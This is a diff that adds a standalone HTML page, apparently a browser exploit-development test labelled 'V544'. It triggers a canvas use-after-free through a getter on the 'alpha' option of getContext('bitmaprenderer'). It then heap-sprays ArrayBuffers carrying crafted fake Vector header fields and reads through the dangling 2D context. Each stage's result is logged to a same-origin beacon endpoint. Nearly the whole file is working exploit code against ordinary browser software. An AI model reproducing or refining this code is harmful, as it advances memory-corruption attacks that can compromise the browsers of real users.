@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V544</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V544-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+b('BOOT','V544-minimal-js-test');
+b('UA',navigator.userAgent);
+
+// T0: Basic canvas creation (no UAF)
+try{
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.lineWidth=42.5;
+  b('T0','lineWidth='+ctx.lineWidth);
+}catch(e){b('T0-ERR',e.message)}
+
+// T1: UAF trigger + getContextAttributes only (safest oracle)
+try{
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      innerCtx.lineWidth=11111.11111;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  b('T1-UAF','triggered');
+
+  // Read getContextAttributes on dangling ref (safe — reads inline m_settings)
+  var a=innerCtx.getContextAttributes();
+  b('T1-ATTRS','alpha='+a.alpha+',desync='+a.desynchronized);
+}catch(e){b('T1-ERR',e.message)}
+
+// T2: UAF + AB(768) spray + getContextAttributes
+try{
+  var outer2=document.createElement('canvas');
+  outer2.width=1;outer2.height=1;
+  var ctx2=null;
+  var dict2={};
+  Object.defineProperty(dict2,'alpha',{
+    get:function(){
+      ctx2=outer2.getContext('2d');
+      ctx2.lineWidth=22222.22222;
+      return true;
+    }
+  });
+  outer2.getContext('bitmaprenderer',dict2);
+  b('T2-UAF','triggered');
+
+  // Spray AB(768)
+  var abs=[];
+  for(var i=0;i<200;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T2-SPRAY','200 ABs');
+
+  // Safe oracle
+  var a2=ctx2.getContextAttributes();
+  b('T2-ATTRS','alpha='+a2.alpha+',desync='+a2.desynchronized);
+}catch(e){b('T2-ERR',e.message)}
+
+// T3: UAF + AB(768) with data + getContextAttributes
+try{
+  var outer3=document.createElement('canvas');
+  outer3.width=1;outer3.height=1;
+  var ctx3=null;
+  var dict3={};
+  Object.defineProperty(dict3,'alpha',{
+    get:function(){
+      ctx3=outer3.getContext('2d');
+      ctx3.lineWidth=33333.33333;
+      return true;
+    }
+  });
+  outer3.getContext('bitmaprenderer',dict3);
+  b('T3-UAF','triggered');
+
+  // Spray AB(768) with marker data
+  var abs3=[];
+  for(var i=0;i<200;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    // Write m_size=1 at offset 124 (stateStack Vector header)
+    dv.setUint32(120,1,true);  // m_capacity=1
+    dv.setUint32(124,1,true);  // m_size=1
+    // Fill inline buffer area (offset 128+) with recognizable pattern
+    for(var k=128;k<768;k+=8){
+      dv.setFloat64(k,99999.12345,true);
+    }
+    abs3.push(ab);
+  }
+  b('T3-SPRAY','200 ABs with m_size=1 at off124');
+
+  // Safe oracle only
+  var a3=ctx3.getContextAttributes();
+  b('T3-ATTRS','alpha='+a3.alpha+',desync='+a3.desynchronized);
+
+  // Now try lineWidth read (may crash — m_buffer=NULL)
+  try{
+    var lw=ctx3.lineWidth;
+    b('T3-LW','!!!SURVIVED!!! val='+lw);
+  }catch(e){b('T3-LW-ERR',e.message)}
+}catch(e){b('T3-ERR',e.message)}
+
+b('DONE','V544-all-complete');
+</script>
+</body></html>
